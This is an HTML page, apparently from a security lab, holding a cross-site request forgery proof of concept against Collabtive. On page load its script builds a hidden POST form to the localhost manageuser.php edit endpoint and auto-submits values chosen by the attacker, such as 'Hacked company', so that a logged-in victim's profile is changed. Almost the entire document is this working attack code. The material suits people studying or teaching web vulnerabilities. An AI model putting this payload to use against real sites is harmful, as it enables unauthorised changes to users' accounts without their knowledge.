<html>
<body>
<h1>
This page creates a form like the one on collab's edit profit, fills fields and submits the form.
</h1>
<script>

function fill_and_send_form()
{ 
// Create a form element, set its attributes, and submit the form

// Create a <form> element.
var e = document.createElement("form");

e.method = "post";
e.action = "http://localhost/collabtive/manageuser.php?action=edit";
e.target = "_self";
// Create a string with html to set hidden fields 
// corresponding to the edit user form
// with values chosen by the attacker. 
var form_fields;

//Address line
//form_fields += 
//"<td class='right'><input type='text' value='compromised address' name='address1' id='address1' /></td>";

//Username line
form_fields += "class='right'><input type='text' class='text' value='victim' name='name' id='name' required='1' realname='Name' tabindex='1' /></td>";

//Company name line
form_fields += "<input type='text' name='company' id='company' value='Hacked company' />";

//phone line
form_fields += "<input type='text' class='text' value='867-5309' name='tel1' id='tel1' />";


// Add the fields to the form
e.innerHTML = form_fields;

// Add the form to the current page.
document.body.appendChild(e);

//submit the form
e.submit();
}

// As soon as the page loads, create the form, fill it and submit it
window.onload = function() {fill_and_send_form();}
</script>

</body>
</html>

